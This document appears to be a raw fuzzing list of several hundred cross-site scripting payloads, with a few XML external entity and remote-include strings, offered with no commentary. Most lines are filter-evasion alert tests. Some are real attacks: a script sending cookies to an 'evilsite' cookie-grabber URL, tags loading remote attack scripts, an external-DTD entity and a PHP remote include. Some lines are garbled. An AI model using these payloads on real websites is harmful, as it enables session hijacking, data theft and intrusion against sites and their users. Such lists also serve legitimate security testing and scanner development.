&#60;IFRAME SRC&#61;http&#58;&#47;&#47;testsite.com&#47;scriptlet.html &#60;
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
'><input type=image src=X.gif onreadystatechange=alert(1)>
"<svg><set href=#script attributeName=href to=data:,alert(1)/>"
"""onKeyDown=""&#00112;arent['aleraaaaat'.replace('aaaaa','')]('XaaaaaSaaaaaS'.replace('aaaaa','').replace('aaaaa',''))"""
"&q=';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E"
"<IMG DYNSRC=""javascript:alert('CrossSiteScripting')"">"
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>"
"<a href=""javascript#alert(1);"">"
">""<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=document.cookie=true;>"
"<SCRIPT a="">"" SRC=""http://127.0.0.1:3555/xss_serve_payloads/X.js""></SCRIPT>"
"<applet onreadystatechange applet onreadystatechange=""javascript:javascript:alert(1)""></applet onreadystatechange>"
"&query=XSS&ps=&loc=searchbox&tab=web&currProv=lygo&mode=&dfi=<script>alert%28""XSS""%29</script>"
<body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;
"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">CrossSiteScripting</A>"
"<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">"
"<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>"
"a=""get"";&#10;b=""URL(\"""";&#10;c=""javascript:"";&#10;d=""alert(1);\"")"";&#10;eval(a+b+c+d);"
"<div datafld=""b"" dataformatas=""html"" datasrc=""#X""></div>"
&cx=003481944941899604444%3Ad947h5mvseo&cof=FORID%3A10&ie=UTF-8&q=%3Cimg+src%3Dhttp%3A%2F%2Fthumbs.reddit.com%2Ft5_2qxe8.png%3Fv%3D60c0bc6ee97246414e7b0738fb0040ef%2F%3E&sa.x=0&sa.y=0&sa=search#262
"""><iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >"
"\"";alert(1);//"
">""<img src=""mocha:document.cookie=true;"">"
<abeon style=font-size:12px onmouseover=confirm(1)>abeon
<body onbeforeactivate=alert(1)>
"""\""><marquee/onstart=confirm(/XSS/.source);confirm(1)>"","
"?<script>document.cookie=""testgtcl=675;""</script>"
&#X0003e
"<![<CDATA[C%Ada b=""c"":]]]>"
"<script>x=""""*prompt(9)*"""";y=42;</script>"
'><script>alert(1)</script>/
"0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//"";alert(String.fromCharCode?(88,83,83))//\"";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search"
"'><img/src=""mars.png""alt=""mars"">"
"""><script>alert(/X/)</script>"
'><script>eval(‘a\x6cert(1)’);</script>
"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt='"
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
<div/style=content:url(data:image/svg+xml);visibility:visible onmouseover=confirm(1)>Mouse Over</div>
"<!-- IE 6-8 --><x '=""foo""><x foo='><img src=x onerror=alert(1)//'><!-- IE 6-9 --><! '=""foo""><x foo='><img src=x onerror=alert(2)//'><? '=""foo""><x foo='><img src=x onerror=alert(3)//'>"
"""><input type=""text"" value=``<div/onmouseover='alert(1)'>X</div>"
*/alert(1)</script><script>/*
"'><?xml-stylesheet type=""text/xsl"" href=""#"" ?> <stylesheet xmlns=""http://www.w3.org/TR/WD-xsl""> <template match=""/""> <eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval> <if expr=""new ActiveXObject('htmlfile').parentWindow.alert(2)""></if> </template> </stylesheet>"
<script>({0:#0=alert/#0#/#0#(123)})</script>
&storeId=10151&langId=-1&catalogId=10051&N=0&newSearch=true&Ntt=%22%3Ciframe%20src=%22http://reddit.com/r/xss%22%20width=%22800%22%20height=%22600%22
"""><svg onload=document.body.innerHTML=location.hash>#<svg/onload=prompt(1)>"
"<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>"
<isindex/autofocus/onfocus=alert()>
"ABC<div style=""x:\\x20expression(javascript:alert(1)"">DEF"
“><script>prompt(1)</script>
&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
"</script><svg '//"""
"<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]>"
&searchterm=%3CsVg%2FOnLOaD%3Dprompt%28%2FXSSPOSED%2F%29%3E&searchpath=%2Fcontent%2Fngaweb%2Fglobal-site-search-page&pageNumber=1
'><video onprogress=alert(1)><source src=//a.a>
"&theStyle=COABETA&lang=en%22%3E%3Cscript%3Ealert%28%22Silly%20NRO,%20XSS%20is%20for%20kids!%22%29;document.write%28%22%3Cimg%20src=%27http://img651.imageshack.us/img651/2102/6a00d83451c49a69e201348.jpg%27%20style=%27display:block;position:absolute;top:0;left:0;%27/%3E%22%29;%3C/script%3E"
%uff02%uff1e
"""\""\/><object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4='></object>"""
"""><scri\x00pt>alert(1);</scri%00pt>"
"a=""get"";b=""URL(\\"""";c=""javascript:"";d=""alert(\'XSS\');\\"")"";eval(a+b+c+d);"
"<SPAN DATASRC=""#CrossSiteScripting"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>"
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"&action=search&firstRequest=1&searchindex=gsa&query=';alert(/XSSPOSED)//\\';alert(1)//"";alert(2)//\\"";alert(/XSSPOSED/)//--></SCRIPT>"">'><SCRIPT>alert(/XSSPOSED/)</SCRIPT>=&{}"");}alert(6);function+xss(){//&q=';alert(0)//\\';alert(1)//"";alert(2)//\\"";alert(/XSSPOSED/)//--></SCRIPT>"">'><SCRIPT>alert(/XSSPOSED/)</SCRIPT>=&{}"");}alert(6);function+xss(){//"
"<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>"
"<!--#echo var=""date_local"" -->"
\'-alert(1)//
"""><meta http-equiv=""refresh"" content=""0;javascript&colon;confirm(1)""/>"
&lt;IMG SRC='vbscript:msgbox(1)'&gt;
"<video><source onerror=""prompt(1)"">"
&keyword=%22%3EXSS%3Csvg/onload=alert%28/xssposed/%29%3E&fname=&lname=&unit=&submit=Search
"<A HREF=""//www.google.com/"">XSS</A>"
<a href=j&#x00000000041vascr&#x00000000069pt:alert(1)>X</a>
"&lt;SCRIPT a=\""&gt;'&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;"
"<div style=""x:expression(alert(1))"">Joker</div>"
"<div style=""background-image: url(javascript:document.cookie=true;);"">"
<form action=javascript:alert(1)><input type=submit>
"<BASE HREF=""javascript:alert(1);//"">"
"a href=""j&#x26;#x26#x41;vascript:confirm%252831337%2529"">Hello</a>"
"--></script></title></style>""/</textarea><a' onclick=alert()//>*/alert()/*"
<body/onactivate=alert(1)>
"""><img/onerror=alert(1) src=a>"
“<script>prompt(1)</script>
"-1<IMG SRC=""jav ascript:document.cookie=true;"">"
"perl -e \'print \\""&lt;SCR\\0IPT&gt;alert(\\\\""XSS\\\\"")&lt;/SCR\\0IPT&gt;\\"";\' &gt; out"
%253cimg%20onerror=alert(1)%20src=a%253e
-1<BODY ONLOAD=document.cookie=true;>
<script>eval(‘a\l\ert\(1\)’);</script>
"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>"
"'><meta charset=""x-mac-farsi"">Â¼script Â¾alert(1)//Â¼/script Â¾"
"<a href=""\\x1Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
"\""></style></script><script>alert(0x000123)</script>"
"<svg></ y=""><x"" onload=confirm(4)>"
"<DIV STYLE=""background-image: url(javascript:alert('CrossSiteScripting'))"">"
"""><image src=1 href=1 onerror=""javascript:alert(1)""></image>"
"ABC<div style=""x:\x0Dexpression(javascript:alert(1)"">DEF"
"-1<CrossSiteScripting STYLE=""CrossSiteScripting:expression(document.cookie=true)"">"
"&lt;XML SRC=\\""xsstest&#46;xml\\"" ID=I&gt;&lt;/XML&gt;"
"'><?xml-stylesheet type=""text/css"" href=""data:,*%7bx:expression(write(2));%7d""?>"
<video onprogress=alert(1)><source src=//a.a>
<ſcript/async/src=//⒛₨>
">""<CrossSiteScripting STYLE=""CrossSiteScripting:expression(document.cookie=true)"">"
&#60;META HTTP-EQUIV&#61;&#34;refresh&#34; CONTENT&#61;&#34;0&#59; URL&#61;http&#58;&#47;&#47;&#59;URL&#61;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
#ERROR!
"""><FRAMESET><FRAME RC=""""+""javascript:alert('X');""></FRAMESET>"
-confirm(1)-
"'><IMG SRC="" &#14;  javascript:alert(1);"">"
"<svg xmlns:xlink=""http://www.w3.org/1999/xlink""><a><circle r=100 /><animate attributeName=""xlink:href"" values="";javascript:alert(1)"" begin=""0s"" dur=""0.1s"" fill=""freeze""/>"
"&lt;EMBED SRC=\\""http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\\"" AllowScriptAccess=\\""always\\""&gt;&lt;/EMBED&gt;"
&source=20121104_final_push_video#!/
<script language=vbs>MsgBox 1</script>
"""<xml src=""""javascript:document.write(""""XSS-XSS-XSS"""");"""">"""
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click"
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<img src='1' o\x00nerr\x00or=alert(0) />
phpinfo();
"=""/>%3ciframe%20src%3djavascript%3aalert%283%29%3e"
"""\""><script>confirm(String.fromCharCode(88,83,83));</script>"","
"""><iframe src='' onload=alert('mphone')>"
"<!DOCTYPE xxe [<!ENTITY foo ""aaaaaa"">]>"
"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>"
"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">"
"<doc xmlns:xlink=""http://www.w3.org/1999/xlink"" xmlns:html=""http://www.w3.org/1999/xhtml"">	<html:style /><x xlink:href=""javascript:alert(1)"" xlink:type=""simple"">XXX</x></doc>"
<marquee/onstart=this['innerHTML']=location.hash;>//#<img src=x onerror=alert(document.domain)>
"&lt;SCRIPT \""a='&gt;'\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;"
"""<SCRIPT/SRC=""""http://ha.ckers.org/xss.js""""></SCRIPT>"""
&#X0003C;
&c1=sg%22%3E%3Cscript%3Ealert%28%22NullCrew%22%29%3C/script%3E
add name <script>alert('VL')</script>
"<div id=""x"">x</div><xml:namespace prefix=""t""><import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=alert(1)&gt;"">"
<!DOCTY
"<textarea>jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e</textarea>"
&s=%3Cscript%3Ealert(%22XSS%22);%3C/script%3E
"<script\\x0Ctype=""text/javascript"">javascript:alert(1);</script>"
"<script>location.href=""http://www.evilsite.org/cookiegrabber.php?cookie=""??(document.cookie)</script>"
"<iframe xmlns=""#"" src=""javascript:alert(1)""></iframe>"
"""><img src='http://127.0.0.1:3555/xss_serve_payloads/X.html' onload=alert(1)//></img>"
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"&lt;OBJECT TYPE=\\""text/x-scriptlet\\"" DATA=\\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\\""&gt;&lt;/OBJECT&gt;"
<input onblur=write(1) autofocus><input autofocus>
"<meta http-equiv=Set-Cookie content=""testqomc=9034"">"
"<a href=""\\x17javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">"
"""<DIV STYLE=""""background-image: url(&#1;javascript:alert('XSS'))"""">"""
<scri%00pt>alert(1);</scri%00pt>
&#x003C;
"'><form name=self location=""javascript:alert(1)"">"
\'><body onload=\'X\'>
"""><<SCRIPT>alert(1);//<</SCRIPT>"
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
prompt(top.dump?'Firefox':top.Debug?'IE':top.Rect?'Safari':'Chrome')
"""><%0bscript>alert(1);</script>"
%3Cscript%0Caaaaa%3Ealert%28123%29%3C/script%0Caaaaa%3E
"ABC<div style=""x:\xE2\x80\x82expression(javascript:alert(1)"">DEF"
"ABC<div style=""x:\xE2\x80\x87expression(javascript:alert(1)"">DEF"
"<form/action='data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt'><button>CLICK // Mario"
"<form id=""myform"" value="""" action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)><textarea>confirm(1)</textarea><input type=""submit"" value=""Absenden""></form>"
prompt(1)-eval(JSON.parse(name).input)
"<a href=""// Í¥.ws"">CLICK"
for((i)in(self))eval(i)(1)
"'><BGSOUND SRC=""javascript:alert(1);"">"
document.location=window.name%2b%27//%27%2b
"-1<BR SIZE=""&{document.cookie=true}"">"
&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;
"<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>"
"<img =""><script>alert(1)</script>"">"
&ics_src=%22%3E%3Cimg%20src=%22http://tinyurl.com/yjmg7z9%22%20onload=%22alert%28document.cookie%29%22%3E
"""><scri%00pt>alert(1);</scri%00pt>"
"""\""><script>confirm(0)</script>"","
">""<STYLE>.CrossSiteScripting{background-image:url(""javascript:document.cookie=true"");}</STYLE><A CLASS=CrossSiteScripting></A>"
%BCscript%BEalert(%A21%A2)%BC/script%BE
"'""><img src=x onerror=prompt(0);""onfocus=prompt(3); """
<form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(document.cookie)><button/type=submit>
%253E%2522%253C%253E%2522%253Cscript%253Econfirm%25281%2529%253C%252Fscript%253E
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
"<img \\x00src=x onerror=""alert(1)"">"
"""><script>prompt(1)</script>"
-{valueOf(){alert`:D`}}
"<img src=""xx:x"" alt=""``onerror=confirm(1)""><script>document.body.innerHTML+=''</script>"
"""`\'><script>\\x3Bjavascript:alert(1)</script>"
"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">"
set system contact <script>alert('VL')</script>
"<XSS STYLE=""behavior: url(%(htc)s);"">"
"<script>document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));</script>"
"""-prompt(9)-"""
"{${include(""http://url/code.txt"")}}"
&nftype=empty&queryText=%22;+alert%28%22XSS%22%29;//&_requestid=305979
"<script>alert(""hellox worldss"");</script>"
"'><img style=""xss:expression(alert(1))"">"
"d&#x61;t&#x61;&colon;text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="
<script>confirm(1)</script>
"<iframe ""onload=alert(1)></iframe>"
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>"
&#062
"""><IMG SRC=""jav	ascript:alert(1);"">"
/> <img src='aaa' onerror=confirm(document.domain)>
&id_menu=%22%3E%3Csvg/onload=alert%28/xssposed/%29%20%3E
"<meta http-equiv=""refresh"" content=""0;javascript&colon;confirm(1)""/>"
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
"""><img src=&#0000106&#0000097&#0000118&#0000097 &#0000115&#0000099&#0000114&#0000105&#0000112 &#0000116&#0000058&#0000097&#0000108&#0000101 &#0000114&#0000116&#0000040&#0000039&#0000088 &#0000083&#0000083&#0000039&#0000041>"
"'><iframe src=""javascript:x:alert(1)"">"
"""><video onprogress=alert(1)><source src=x>"
< s c r i p t > p r o m p t ( 1 ) < / s c r i p t >
"'><IMG SRC=""jav&#x0D;ascript:alert(1);"">"
<img src=`x` onrerror= ` ;; alert(1) ` />
&uq=and(/></script><script>alert('0');</script>)
"<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM ""http://xss.cx""> %dtd;]><xxx/>]]></foo></soap:Body>"
&{document.cookie=true;};
"<svg </onload =""1> (_=alert,_(1)) """">"
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver
&#x03C
"<IMG+SRC=""jav&#x09;ascript:alert(1);"">"
"""><isindexformaction=""javascript:alert(1)"" type=image>"
"<STYLE>li {list-style-image: url(""javascript:javascript:alert(1)"");}</STYLE><UL><LI>XSS"
"&lt;LINK REL=\""stylesheet\"" HREF=\""javascript&#058;alert('XSS');\""&gt;"
"&lt;IMG SRC=\\""javascript&#058;alert(\'XSS\')\\"""
"-1<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">"
&adID=DEGWORDSTATUS&orderNum=%22%3E%3Cscript%3Ealert%28%27XSS%27%29;%3C/script%3E&postal=50210
"""text </script><script>alert(1)</script>"""
/*@cc_on @if(1)confirm(1)@end
"""><!-- `<img/src=xx:xx onerror=alert(1)//--!>"
<<scr\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp></script
"<div style=""background:url(http://foo.f/f oo/;color:red/*/foo.jpg);"">X</div>"
<object data=javascript&colon;\\u0061&#x6C;&#101%72t(1)>
&#X0003c
"<A HREF=""h tt	p://6&#09;6.000146.0x7.147/"">X</A>"
<script>var%20x%20=%20“a”;%20confirm(1);//”;</script>
"&show=24&brand=a""/><svg/onload=""a=alert;a('XSS')"
"""><script>alert('X')</script>=a"
<iframe/onreadystatechange=alert(1)
"<SCRIPT+a="">'>"" SRC=""http://localhost""></SCRIPT>"
"""<div style=""""width: expression(document.write(""""XSS-XSS-XSS""""););"""">"""
<video onclick=popup=1;>
"""/><a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a"
'><isindex action=javascript:alert(1) type=image>
"___=1?'ert(123)':0,_=1?'al':0,__=1?'ev':0,1[__+_](_+___)"
"""+style%3d""x%3aexpression(alert(1))+"
"'><DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">"
"-1<LINK REL=""stylesheet"" HREF=""javascript:document.cookie=true;"">"
"<a href=""\x07javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
"""<meta http-equiv=""""refresh"""" content=""""0;url=javascript:document.write(""""XSS-XSS-XSS"""");"""">"""
"'><SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp""></SCRIPT>"
'><video poster=javascript:alert(1)//<video poster=javascript:alert(1)//></video>
"eval(""\x61\x6c\x65\x72\x74\x28\x31\x29â€)"
&q=asd%22%3E%3Cscript+src=%22http://www.yourjavascript.com/38310202111/xss.js%22%3E&x=0&y=0
"<!--#echo var=""path_info_translated"" -->"
"""><div contextmenu=x>right-click<menu id=x onshow=alert(1)>"
"<a href=""\x08javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
"<object classid=""clsid:..."" codebase=""javascript:alert(1);"">"
&#x00003e;
"<x 1="">"" onxxx=1"
"<STYLE>BODY{-moz-binding:url(""http://vulnerability-lab.com/CrossSiteScriptingmoz.xml#CrossSiteScripting"")}</STYLE>"
&#60;&#60;SCRIPT&#62;alert&#40;&#34;XSS&#34;&#41;&#59;&#47;&#47;&#60;&#60;&#47;SCRIPT&#62;
with(location)with(hash)eval(substring(1))
width&#x3A;ex/**/pression&#x28;prompt&#x28;1&#x29;&#x29;
"<p style=""font-family:'\22\3bx:expression(alert(1))/*'"">"
"""><img src="""" onerror=alert(1);>"
“><ScRiPt>alert(1)</ScRiPt>
"<x style=""behavior:url(%(sct)s)"">"
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
